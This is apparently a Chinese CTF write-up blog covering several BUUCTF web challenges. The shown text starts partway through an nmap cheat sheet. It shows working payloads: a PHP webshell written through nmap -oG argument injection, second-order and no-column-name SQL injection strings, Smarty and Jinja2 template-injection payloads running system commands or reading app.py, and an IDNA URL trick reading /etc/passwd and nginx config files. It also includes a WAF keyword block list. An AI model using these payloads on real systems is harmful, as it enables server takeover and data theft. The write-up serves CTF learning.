class="number">0.101</span>						查找主机服务版本号</span><br><span class="line"><span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span>						使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line"><span class="keyword">nmap</span> -Pn <span class="number">192.168</span>.<span class="number">96.4</span>					  	目标机禁用ping，绕过ping扫描</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">96.4</span>						对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line"><span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span>						执行一次隐蔽的扫描，安全，快</span><br><span class="line"><span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span>						使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span>						执行TCP空扫描以骗过防火墙</span><br><span class="line"><span class="keyword">nmap</span> -sI 僵尸ip 目标ip						使用僵尸机对目标机发送数据包</span><br><span class="line"><span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">96.4</span> -oX myscan.xml			对扫描结果另存在myscan.xml</span><br><span class="line"><span class="keyword">nmap</span> -T1~<span class="number">6</span> <span class="number">192.168</span>.<span class="number">96.4</span>						设置扫描速度，一般T4足够</span><br><span class="line"><span class="keyword">nmap</span> –mtu <span class="symbol">&lt;size&gt;</span> <span class="number">192.168</span>.<span class="number">96.4</span>				发送的包大小,最大传输单元必须是<span class="number">8</span>的整数</span><br><span class="line"><span class="keyword">nmap</span> -D &lt;假ip&gt; <span class="number">192.168</span>.<span class="number">96.4</span>					发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">	<span class="keyword">nmap</span> –oG <span class="number">1</span>.txt –v <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span>			-oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">	Nmap –resume <span class="number">1</span>.txt							作用：继续扫描</span><br><span class="line"></span><br></pre></td></tr></table></figure>

nmap可以将扫描后的结果保存为文件，这个文件格式甚至可以自己决定

把nmap保存文件的一些方法截下来：

![image-20220517155034102](./buu/image-20220517155034102.png)

文件的后缀可以自己决定，文件内容里还包含了我们输入的查询内容。

回到题目，之前我们猜测了nmap 127.0.0.1 -oX ./xml/????

![image-20220517160316983](./buu/image-20220517160316983.png)

其中127.0.0.1是我们控制的，那我们尝试改成

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure>

测试后发现被拦截了，可能是PHP关键字被拦截了，也可能是oG被禁用了，先试着绕php，后缀可以将php改成phtml

文件的内容<?php中的PHP如何替换上网去查了一下，解决方法是使用短标签<?=

最终payload：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?= @eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table>

如何最后就是去注入写文件，蚁剑连接，读flag，交flag，结束。

## [SWPU2019]Web1

知识点：二次注入,无列名注入,bypass information_ schema

二次注入漏洞在CTF中常见于留言板和注册登录功能,简单来说可以分为两个步骤:

1. 插入恶意数据(发布帖子,注册账号),用mysql_escape_string()函数对恶意字符进行转义,但是再将数据写入数据库中的时候又保留了原来的数据.
2. 引用插入的恶意数据:在进行查询时,直接从数据库中引用恶意数据,没有做进一步过滤和检验.

bypass information_ schema

1. information_schema这个数据库存放着其他数据库的信息,包括表名,字段名等.在常规注入过程中利用information_schema就是想要获取到其中的信息.
2. mysql在5.7版本中新增了sys.schema:
   1. `sys.schema_auto_increment_columns #该视图的作用是对表自增ID进行监控`就是说,某张表如果存在自增ID,我们就可以通过该视图获取数据库的该表名信息.
   2. 如果该表没有自增主键呢?->`sys.schema_table_statistics_with_buffer`
   3. payload(环境:sqli-labs Less1):
      1. `?id=-1‘ union select 1,(select group_concat(table_name) from  sys.schema_auto_increment_columns where table_schema=database()),3 --+`
      2. `?id=-1‘ union select 1,(select group_concat(table_name) from  sys.schema_table_statistics_with_buffer where table_schema=database()),3 --+`
   4. 限制条件:
      1. mysql version>=5.7
      2. 要求权限高,一般root用户才可以访问

无列名注入

如果information_schema被WAF,得到表名之后使用无列名注入技巧获取字段值，之后就可以利用数字来对应相应的列,进行查询

1. 列名需要用``包裹起来
2. 使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)
3. 如果反引号``被过滤,可以使用为字段起别名的方式.

解题：

**1)留言板二次注入：我们申请广告的时候数据库将我们输入的恶意字符进行转义，但是写入数据库的时候会将数据还原。当点击查看广告详情的时候数据库对查询到的结果并未严格过滤，导致了二次注入。**
**2)题目过滤了空格，or，注释符号，导致了order by,information_schema都被WAF.绕过姿势:空格用内联注释绕过，or用异或^绕过，最后考虑闭合单引号的问题。**
**3)这道题目在buuoj上的复现是没办法用sys.schema来bypass  information_schema的，原因是buuoj没有sys.schema_table_statistics_with_buffer这个数据库，但是比赛中是可以利用的，所以还是要作为一个技巧来积累。**这里可以通过mysql.innodb_table_stats来进行获取表名

1. 开头的注册登录只是幌子,注册账号,进入留言板.
2. 发现注入点:

3. 猜解字段数：`-1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,22'`

因为过滤了‘or‘导致order by无法使用，得用到联合查询一个个试

点击广告详情得到：![image-20220519150719110](./buu/image-20220519150719110.png)

然后去爆数据库:

`1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

![image-20220519151021213](./buu/image-20220519151021213.png)

爆表名，这里不能使用or，所以这里使用的是新的payload

`1'/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'`

![image-20220519151119552](./buu/image-20220519151119552.png)

去爆users的字段

`1'/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

![image-20220519151321213](./buu/image-20220519151321213.png)

在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。

无列名注入原理：

类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。

**不使用表名查询**

正常的 sql 查询如下：

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span>;</span><br></pre></td></tr></table></figure>

![image-20220519152114463](./buu/image-20220519152114463.png)

其中，列名为 id、name、password，使用 union 查询：

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>;</span><br></pre></td></tr></table></figure>

![image-20220519152150115](./buu/image-20220519152150115.png)

如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure>

![image-20220519152240732](./buu/image-20220519152240732.png)

末尾的 a 可以是任意字符，用于命名。

当然，多数情况下，`` `会被过滤。当 ` 不能使用的时候，使用别名来代替：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>

同时查询多个列：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure>

简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。

## [CISCN2019 华东南赛区]Web11

![image-20220521112140043](./buu/image-20220521112140043.png)

![image-20220521112906839](./buu/image-20220521112906839.png)

![image-20220521112745960](./buu/image-20220521112745960.png)

根据下面的三张图提示，可以看出是`smart ssti`，在`XFF`处构造payload，在做题前先了解一下啥是smart。

smart是php的模板引擎，模板引擎的作用就是分离前端页面和数据的，题目中显示API的URL由于环境的原因无法使用，但我们的IP依旧显示在了页面的右上角，且根据它的提示XFF我们很容易想到，在X-Forwarded-For里构造ssti：payload

![image-20220521112933064](./buu/image-20220521112933064.png)

![image-20220521113103030](./buu/image-20220521113103030.png)

Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，那么我们可以使用&#123;php&#125;&#123;/php&#125;标签来构造payload，但是本题会报错
 ![image-20220521113239636](./buu/image-20220521113239636.png)

因为现在的smart已经不用此标签了。
 可以用`&#123;$smarty.version&#125;`来看一下版本

![image-20220521113322909](./buu/image-20220521113322909.png)

虽然php标签不能用，但是还有个&#123;if&#125;标签。
Smarty的&#123;if&#125;条件判断和PHP的if 非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;. 也可以使用&#123;else&#125; 和 &#123;elseif&#125;. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&&,and,is_array(), 等等

既然全部的PHP条件表达式和函数都可以在if内使用,那我们在里面写php代码也行。
&#123;if phpinfo()&#125;&#123;/if&#125;
&#123;if system('cat /flag')&#125;&#123;/if&#125;

![image-20220521114228136](buu/image-20220521114228136.png)

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们通过一串代码来了解一下，它的漏洞为什么会产生。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line"><span class="comment">//获取XFF</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line"><span class="comment">//此处并不是以smart模板格式，而是以字符串形式，所以会解析我们的标签，也就是if,解析后把内容回显到页面上的相应位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [SUCTF 2019]Pythonginx

![image-20220528133730959](./buu/image-20220528133730959.png)

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        </span><br><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>

`urlsplit`是拆分，而`urlparse`是解析，所以`urlparse`粒度更为细致

前两个判断 host 是否是 suctf.cc ，如果不是才能继续，而进入后面的read()又需要host为suctf.cc
urlsplit()是 urllib.parse 模块下的一个函数，跟 urlparse 效果一样用来对 url 进行分割，但是有一点不一样的是 urlsplit 分割出来的没有 params 这个属性。
漏洞原理：
用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。
例如，在直接比较中，\ uFF03不等于’＃’，而是统一化为’＃’，这会更改 URL 的片段部分。类似地，\ u2100 统一化为’a/c’，它引入了路径段。

在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。


考点：

　　1.nginx重要文件的位置

　　2.

　　（1）.CVE-2019-9636：urlsplit不处理NFKC标准化

　　（2）.url中的unicode漏洞引发的域名安全问题

　　（3）.python脚本

　　nginx重要文件的位置：　

　　　　配置文件存放目录：/etc/nginx
　　　　主配置文件：/etc/nginx/conf/nginx.conf
　　　　管理脚本：/usr/lib64/systemd/system/nginx.service
　　　　模块：/usr/lisb64/nginx/modules
　　　　应用程序：/usr/sbin/nginx
　　　　程序默认存放位置：/usr/share/nginx/html
　　　　日志默认存放位置：/var/log/nginx
　　　　配置文件目录为：/usr/local/nginx/conf/nginx.conf

查看代码。去/getUrl这个路由中，host接受url传过来的值，然后对host的值进行判断。

方法一：利用了urlsplit不处理NFKC标准化

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">//</span><span class="regexp">/suctf.cc/</span>etc/passwd</span><br></pre></td></tr></table></figure>

　　查看nginx的配置文件目录：

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">//</span><span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">//</span><span class="regexp">/suctf.cc/u</span>sr/fffffflag</span><br></pre></td></tr></table></figure>

![image-20220528134400585](./buu/image-20220528134400585.png)

![image-20220528134339886](./buu/image-20220528134339886.png)

方法二：unicode漏洞引发的域名安全问题

　　[url中的unicode漏洞引发的域名安全问题 ](https://xz.aliyun.com/t/6070)

　　[idna与utf-8编码漏洞](https://www.cnblogs.com/cimuhuashuimu/p/11490431.html)

**可以利用的unicode字符**

U+2100, `℀`      U+2101, `℁`        U+2105, `℅`    U+2106, `℆`    U+FF0F,`／`    U+2047, `⁇`    U+2048, `⁈`   U+2049, `⁉`

U+FE16, `︖`     U+FE56, `﹖`   U+FF1F,`？`    U+FE5F, `﹟`    U+FF03, `＃`      U+FE6B, `﹫`    U+FF20, `＠`

　　在这就是℆在经过下面的代码被解释为c/u。

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host<span class="selector-class">.split</span>(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">      newhost<span class="selector-class">.append</span>(h<span class="selector-class">.encode</span>(<span class="string">&#x27;idna&#x27;</span>)<span class="selector-class">.decode</span>(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

当然其他的符号也可以： 例：用ℂ替换c

payload:

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.c℆sr/</span>local<span class="regexp">/nginx/</span>conf/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.cℂ/u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>

方法三：

　　用python脚本（大佬的WP）

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">        uni=<span class="built_in">chr</span>(x)</span><br><span class="line">        url=<span class="string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="built_in">format</span>(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span>+uni+<span class="string">&#x27; unicode: \\u&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>(<span class="params">url</span>):</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>

## [GYCTF2020]FlaskApp

![image-20220528153843033](./buu/image-20220528153843033.png)

因为题目名[flask](https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020)，所以先不进行常规信息收集，而是观察功能点，寻找易发生ssti的功能

提示里貌似没有什么信息，考虑到功能异常抛出常见于解密环节，所以随便输段不能解密的

输入123456

直接报错抛出debug信息，开启了debug模式

参见该文章：[Flask开启debug模式等于给黑客留了后门](https://zhuanlan.zhihu.com/p/32138231)

而且读到了app.py的部分代码
 大致的逻辑就是获取text参数，进行解密，如果可以过waf则执行代码

![image-20220528154020859](./buu/image-20220528154020859.png)

![image-20220528154102304](./buu/image-20220528154102304.png)

进一步尝试是否ssti，在加密界面对`&#123;&#123;6*6&#125;&#125;`进行加密，结果为`e3s2KjZ9fQ==`，再在解密界面进行解密，疑似是有一定防御，那么换成&#123;&#123;3+3&#125;&#125;，成功返回6

说明确实存在ssti，接下来就是具体怎么利用的过程了

预备知识

在jinja2中 控制结构 `&#123;% %&#125;` 变量取值 `&#123;&#123; &#125;&#125;`
 函数和属性

<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">__class__</span>         返回调用的参数类型</span><br><span class="line"><span class="variable">__bases__</span>         返回基类列表 </span><br><span class="line"><span class="variable">__mro__</span>           此属性是在方法解析期间寻找基类时的参考类元组 </span><br><span class="line"><span class="variable">__subclasses__</span>()  返回子类的列表 </span><br><span class="line"><span class="variable">__globals__</span>       以字典的形式返回函数所在的全局命名空间所定义的全局变量，与 func_globals 等价 </span><br><span class="line"><span class="variable">__builtins__</span>      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-<span class="built_in">in</span> 函数，例如eval, <span class="built_in">exec</span>, open等等</span><br></pre></td></tr></table></figure>

[python内建函数文档](https://docs.python.org/zh-cn/3/library/functions.html#built-in-funcs)

具体利用

直接读flag

首先想办法把完整的app.py读出来，方便绕waf
 参考[Templates Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#twig)的payload

<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span></span><br><span class="line"><span class="xml">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123;<span class="name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">request.args.input</span>).read()&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#123;%endif%&#125;&#123;%endfor%&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">修改成：</span></span><br><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span></span><br><span class="line"><span class="xml">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">记得最后要改成一行</span></span><br><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">然后加密解密</span></span><br><span class="line"><span class="xml">得到结果</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

![image-20220528154932107](./buu/image-20220528154932107.png)

把中间的waf函数代码美化一下

<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def waf(str): </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    #<span class="number">34</span>;flag&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;os&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;<span class="keyword">system</span>&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;popen&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;<span class="keyword">import</span>&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;eval&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;chr&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;request&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;subprocess&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;commands&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;socket&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;hex&amp;# <span class="number">34</span>;, &amp;</span><br><span class="line">    #<span class="number">34</span>;base64&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;*&amp;# <span class="number">34</span>;, &amp; #<span class="number">34</span>;?&amp;# <span class="number">34</span>;</span><br><span class="line">]</span><br><span class="line">  for x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> str.lower(): </span><br><span class="line">      return <span class="number">1</span>@ app.route( &amp;#<span class="number">39</span>;/hint&amp;# <span class="number">39</span>;, methods = [ &amp; #<span class="number">39</span>;GET&amp;# <span class="number">39</span>;])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

字符串拼接绕过

从 black list大致知道了关键字，另外会将字符转小写，所以没法通过lower方法或者base64、hex一下绕过，但是最常见的是字符串拼接绕过，参考[菜鸟教程](https://www.runoob.com/python/os-file-methods.html)找到os模块的一些方法
 先使用listdir方法看看当前目录文件

